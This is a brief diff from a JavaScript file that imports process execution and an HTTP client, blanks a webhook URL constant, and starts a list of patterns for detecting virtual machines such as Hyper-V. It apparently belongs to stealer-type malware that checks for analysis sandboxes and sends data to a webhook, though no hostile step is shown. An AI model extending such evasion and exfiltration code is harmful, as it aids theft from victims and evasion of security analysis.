@@ -4,7 +4,7 @@ const path = require("path");
 const { exec } = require("child_process");
 const axios = require("axios");
 
-const webhookUrl = "WEBHOOK";
+const webhookUrl = "";
 
 const virtualizationPlatforms = [
   /Microsoft Corporation.*Hyper-V/i,
